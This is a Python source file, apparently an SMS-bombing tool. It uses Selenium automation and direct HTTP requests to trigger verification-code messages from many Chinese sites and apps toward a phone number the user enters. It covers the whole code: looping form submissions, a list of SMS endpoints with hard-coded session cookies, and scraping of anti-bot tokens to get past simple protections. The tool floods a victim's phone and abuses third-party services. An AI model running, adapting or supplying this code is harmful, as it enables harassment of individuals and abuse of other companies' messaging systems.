from selenium import webdriver
import time


class HongZha:

    def __init__(self,phone):
        self.phone = phone  # 手机号
        self.num = 10  # 次数，初始值为0

    # 发送验证码
    def send_yzm(self, button, name):
        button.click()
        self.num += 1
        print("{}  第{}次  发送成功  {}".format(self.phone, self.num, name))

    # 饿了么
    def ele(self, name):
        driver.get('https://open.shop.ele.me/openapi/register')
        driver.find_element_by_class_name('el-checkbox__inner').click()
        time.sleep(0.5)
        driver.find_element_by_xpath("//*[@class='el-button btn-next-step el-button--primary']").click()
        time.sleep(0.5)
        driver.find_element_by_class_name('el-input__inner').send_keys(self.phone)
        button = driver.find_element_by_class_name('btn-verifyCode')
        self.send_yzm(button, name)

    # 瓜子注册接口
    def guazi(self, name):
        try:
            # driver.implicitly_wait(10)
            driver.get("https://www.guazi.com/www/bj/buy")
            a_btn = driver.find_element_by_xpath("//a[@class='uc-my']")
            a_btn.click()
            tel = driver.find_element_by_xpath("//input[@name='phone']")
            tel.send_keys(self.phone)
            button = driver.find_element_by_xpath("//button[@class='get-code']")
            self.send_yzm(button, name)
        except:
            print('faled')

    # 凤凰智信
    def fenghuang(self, name):
        driver.get('https://www.fengwd.com/')
        time.sleep(0.5)
        driver.find_element_by_xpath("//*[@class='top-bar-item login-tag']/a").click()
        time.sleep(0.5)
        driver.find_element_by_id('mobile_number').send_keys(self.phone)
        button = driver.find_element_by_xpath("//*[@class='get-sms-captcha blue']")
        time.sleep(0.5)
        self.send_yzm(button, name)

    # 四川航空
    def sichuanair(self, name):
        driver.get('http://flights.sichuanair.com/3uair/ibe/profile/createProfile.do')
        driver.find_element_by_name('mobilePhone').send_keys(self.phone)
        time.sleep(0.5)
        button = driver.find_element_by_id('sendSmsCode')
        time.sleep(0.5)
        self.send_yzm(button, name)

    # 昆明航空
    def airkunming(self, name):
        driver.get('https://www.airkunming.com/#/user/register')
        driver.find_element_by_id('mobile').send_keys(self.phone)
        time.sleep(0.5)
        button = driver.find_element_by_xpath("//*[@class='sms-code']")
        time.sleep(0.5)
        self.send_yzm(button, name)

    # 安徽相亲网
    def anhuixiangqing(self, name):
        driver.get('http://www.ahxiangqin.cn/index.php?c=passport&a=reg')
        driver.find_element_by_name('mobile').send_keys([self.phone])
        time.sleep(0.5)
        # browser.find_element_by_class_name('action-send-mobile-code get').click()
        button = driver.find_element_by_xpath("//*[@class = 'action-send-mobile-code get']")
        time.sleep(0.5)
        self.send_yzm(button, name)

    # 唯品会注册接口
    def wphui(self, name):
        driver.get("https://passport.vip.com/register?src=https%3A%2F%2Fwww.vip.com%2F")
        driver.implicitly_wait(10)
        tel = driver.find_element_by_xpath("//input[@placeholder='请输入手机号码']")
        tel.send_keys(self.phone)
        driver.find_element_by_xpath('//a[contains(./text(),"获取验证码")]').click()
        button = driver.find_element_by_xpath("//a[@class='ui-btn-medium btn-verify-code ui-btn-secondary']")
        self.send_yzm(button, name)

    # 拼多多短信登陆接口
    def pinduoduo(self, name):
        driver.get('http://mobile.yangkeduo.com/login.html')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//div[@class="phone-login"]/span').click()
        driver.find_element_by_xpath('//input[@id="user-mobile"]').send_keys(self.phone)
        time.sleep(0.5)
        button = driver.find_element_by_xpath('//button[@id="code-button"]')
        self.send_yzm(button, name)

    # 微博
    def weibo(self, name):
        try:
            driver.get('https://weibo.com/signup/signup.php')
            driver.implicitly_wait(0.5)
            driver.find_elements_by_xpath('//input[@class="tel_num"]')[0].send_keys(self.phone)
            driver.find_element_by_xpath('//input[@class="W_input"]').send_keys('woshinibibi123')
            s = driver.find_element_by_xpath('//select[@class="sel year"]')
            s.find_element_by_xpath('//option[@value="1996"]').click()
            s = driver.find_element_by_xpath('//select[@class="sel month"]')
            s.find_element_by_xpath('//option[@value="1"]').click()
            s = driver.find_element_by_xpath('//select[@class="sel day"]')
            s.find_element_by_xpath('//option[@value="1"]').click()
            button = driver.find_element_by_xpath('//a[@class="W_btn_e"]')
            self.send_yzm(button, name)
        except:
            pass

    # 印象笔记
    def yinxiang(self, name):
        driver.get(
            'https://static.app.yinxiang.com/embedded-web/registration/index.html?targetUrl=%2FHome.action#/registration')
        driver.implicitly_wait(10)
        driver.find_elements_by_xpath('//input[@class="registration-account-input "]')[0].send_keys(self.phone)
        driver.find_elements_by_xpath('//input[@placeholder="设置密码，至少6位字符"]')[0].send_keys('woshinibaba123123')
        button = driver.find_elements_by_xpath('//div[@class="registration-sms-vercode-btn-validate"]')[0]
        self.send_yzm(button, name)
        time.sleep(0.5)

    # 豆瓣
    def douban(self, name):
        driver.get('https://www.douban.com/')
        driver.implicitly_wait(10)
        iframe = driver.find_elements_by_tag_name("iframe")[0]  # 由于要找的input在iframe中，直接定位不到该目标，要先转换到其所在的iframe中才行
        driver.switch_to_frame(iframe)
        driver.find_elements_by_xpath('//input[@name="phone"]')[0].send_keys(self.phone)
        button = driver.find_elements_by_xpath('//div[@class="account-form-field-code"]')[0]
        self.send_yzm(button, name)
        time.sleep(0.5)

    # 爱彼迎
    def aibiying(self, name):
        driver.get(
            'https://www.airbnb.cn/?af=43896654&c=.pi9.pkbaidu_brd_brandzone_demand_title_p1&src=Baidu&medium=PPC&ag_kwid=2299-36-57701246c0b98773.6a0cc0f87b49337e')
        driver.implicitly_wait(10)
        driver.find_elements_by_xpath('//div[@class="_18lcoy3z"]')[7].click()  # 顶部导航栏直接定位不到，要先定位导航栏，再逐步定位
        driver.find_elements_by_xpath('//input[@class="_kbzo2td"]')[0].send_keys(self.phone)
        button = driver.find_elements_by_xpath('//button[@class="_1wficfyg"]')[0]
        self.send_yzm(button, name)
        time.sleep(0.5)

    # 循环执行
    def main(self):
        while True:
            self.ele('饿了么')
            time.sleep(0.5)
            self.fenghuang('凤凰')
            time.sleep(0.5)
            self.guazi('瓜子')
            time.sleep(1)
            self.pinduoduo('拼多多')
            time.sleep(1)
            self.sichuanair("四川航空")
            time.sleep(1)
            self.airkunming("昆明航空")
            time.sleep(1)
            self.anhuixiangqing('安徽相亲网')
            time.sleep(1)
            self.weibo('微博')
            time.sleep(1)
            self.yinxiang('印象笔记')
            time.sleep(1)
            self.douban('豆瓣')
            time.sleep(60)  # 睡60s后循环执行

# -*- coding: utf-8 -*-
import json
import re
import time

import requests

api_list = [
    {
        "url": "https://www.yojiang.cn/api/user/send_verify_code?phone=target_Phone",
        "type": "GET",
        "cookie": "guest_uuid=5e3626fd9b6dde14e9293bee; _xsrf=2|a63a71a2|6bfa82e8f3ff66bbf83b67c2a67a9cf5|1580823294; Hm_lvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404; Hm_lpvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404"
    },
    {
        "url": "https://m.health.pingan.com/mapi/smsCode.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1545122608&app=0&platform=3&app_key=PAHealth&osversion=23&info=&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=m_h5&phone=target_Phone",
        "type": "GET"
    },
    {
        "url": "https://www.smartstudy.com/api/user-service/captcha/phone",
        "parm": {
            "type": "authenticode",
            "phone": "target_Phone",
            "countryCode": "86",
        },
        "type": "POST"
    },
    {
        "url": "https://exmail.qq.com/cgi-bin/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=target_Phone",
        "type": "GET",
    },
    {
        "url": "https://accounts.douban.com/j/mobile/login/request_phone_code",
        "type": "POST",
        "parm": {
                    "ck": "",
                    "area_code": "+86",
                    "number": "target_Phone"
    }},
    {
        "url": "https://id.kuaishou.com/pass/kuaishou/sms/requestMobileCode",
        "type": "POST",
        "parm": {
            "sid": "kuaishou.live.web",
            "type": "53",
            "countryCode": "+86",
            "phone": "target_Phone"
        }
    },
    {
        "url": "http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=target_Phone&mbid=197873&check=3",
        "type": "GET",
        "cookie": "PHPSESSID=q8h78o91qm30m5bl7lufkt3go3; jrh_visit_log=q8h78o91qm30m5bl7lufkt3go3; Hm_lvt_b627bb080fd97f01181b26820034cfcb=1580999339; UM_distinctid=1701ae772688ac-09ae1bde44e676-6701b35-144000-1701ae772699ca; CNZZDATA1276814029=219078261-1580999135-%7C1580999135; Hm_lpvt_b627bb080fd97f01181b26820034cfcb=1580999403"
    },
    {
        "url": "https://developer.i4.cn/put/getMsgCode.xhtml?_=1580912157461&phoneNumber=target_Phone&codeType=6",
        "type": "GET"
    },
    {
        "special": "xxsy",
        "first": {
            "url": "https://www.xxsy.net/Reg",
            "type": "GET"
        },
        "url": "https://www.xxsy.net/Reg/Actions",
        "type": "POST",
        "parm": {
            "method": "sms",
            "mobile": "target_Phone",
            "uname": "target_Phone",
            "token": "",
        },
        "headers": {
            "cookie": "ASP.NET_SessionId=1zpetajacprst1vvgvtqvt2u; pcstatpageusersign=1lzva83zoqa3qpid3ukvojnye9xgq0th; UM_distinctid=1701a43b89b44b-0e920e8853ac59-6701b35-144000-1701a43b89c9d1; CNZZDATA1275068799=1423156539-1580988611-https%253A%252F%252Fwww.hao123.com%252F%7C1580988611; CNZZDATA1275068004=1203802890-1580988611-https%253A%252F%252Fwww.hao123.com%252F%7C1580988611; __qc_wId=999; pgv_pvid=1596346520; xxcpoint=GU3TIZJYHE3DOZJTGAZTKOJUGJSGIOJWG5SWCMDDGA4DANJZGJRA",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            "X-Requested-With": "XMLHttpRequest"
        }
    },
    {
        "special": "ruanmei",
        "first": {
            "url": "https://my.ruanmei.com/?page=register",
            "type": "GET"
        },
        "headers": {
            "cookie": "ASP.NET_SessionId=wmw5kiwrmvxibb2zvk2qhxsh; CheckCode=MXPF; CheckCode_fp=GNGW; KLBRSID=b039105d4718660de1867d1c40076e29|1580992153|1580992141; sendsms=Thu%20Feb%2006%202020%2020%3A29%3A13%20GMT+0800%20%28%u4E2D%u56FD%u6807%u51C6%u65F6%u95F4%29",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            "Referer": "https://my.ruanmei.com/?page=register",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/json; charset=UTF-8"
        },
        "url": "https://my.ruanmei.com/Default.aspx/SendSmsReg20190319",
        "type": "POST",
        "parm": {
            "mobile": "target_Phone",
            "checkreg": "true",
            "validate": "",
            "data": ""
        }
    },
    {
        "url": "http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login",
        "type": "POST",
        "parm": {
            "MOBILENO": "target_Phone",
            "TEMP": "1"
        },
        "cookie": "qcdzh-session-id=fe77ec80-efb8-4238-844e-c0e136b349de; UM_distinctid=1701adce0071-069b6727280a07-6701b35-144000-1701adce00891c; CNZZDATA1274944014=862482110-1580998603-http%253A%252F%252Fqydj.scjg.tj.gov.cn%252F%7C1580998603"
    },
]


def replacePhone(phone):
    target_list = []
    for api in api_list:
        api_str = json.dumps(api)
        api_str = api_str.replace("target_Phone", phone)
        target_list.append(json.loads(api_str))
    return target_list


def default(jiekou, headers):
    resp = requests.request(
        url=jiekou["url"],
        method=jiekou["type"],
        headers=headers,
        data=jiekou.get("parm", "")
    )



def caseSpecial(jiekou, special):
    if special == 'xxsy':
        xxsy(jiekou)
    elif special == 'ruanmei':
        ruanmei(jiekou)


def xxsy(jiekou):
    # 获取token
    resp = requests.request(url=jiekou["first"]["url"], method=jiekou["first"]["type"], headers=jiekou["headers"])
    jiekou["parm"]["token"] = re.findall(", checkCode, '(.*?)',", resp.text)[0]

    resp = requests.request(
        url=jiekou["url"],
        method=jiekou["type"],
        headers=jiekou["headers"],
        data=jiekou.get("parm")
    )



def ruanmei(jiekou):
    # 获取token
    resp = requests.request(url=jiekou["first"]["url"], method=jiekou["first"]["type"], headers=jiekou["headers"])
    jiekou["parm"]["data"] = re.findall("id=\"data20190202\" value='(.*?)'", resp.text)[0]
    print(jiekou["parm"]["data"])

    # 发送短信
    resp = requests.request(
        url=jiekou["url"],
        method=jiekou["type"],
        headers=jiekou["headers"],
        data=json.dumps(jiekou.get("parm"))
    )



def run(jiekou_list,phone):
    for jiekou in jiekou_list:
        special = jiekou.get("special")
        if special:
            caseSpecial(jiekou, special)
        else:
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 Html5Plus/1.0',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
                'cache-control': 'max-age=0',
                "X-Requested-With": "XMLHttpRequest",
                'cookie': jiekou.get("cookie", ""),
                "referer": jiekou.get("referer", ""),
            }
            if jiekou.get("headers"):
                headers = jiekou.get("headers")
            default(jiekou, headers)
    # driver_path = r"/home/jiuzhang/jobs/plug-in_unit/chromedriver"
    # driver = webdriver.Chrome(executable_path=driver_path)
    # 
    # hongzha = HongZha(phone=phone)
    # hongzha.main()

if __name__ == '__main__':
    phone = input("输入手机号: ")
    target_list = replacePhone(phone)
    run(target_list,phone)
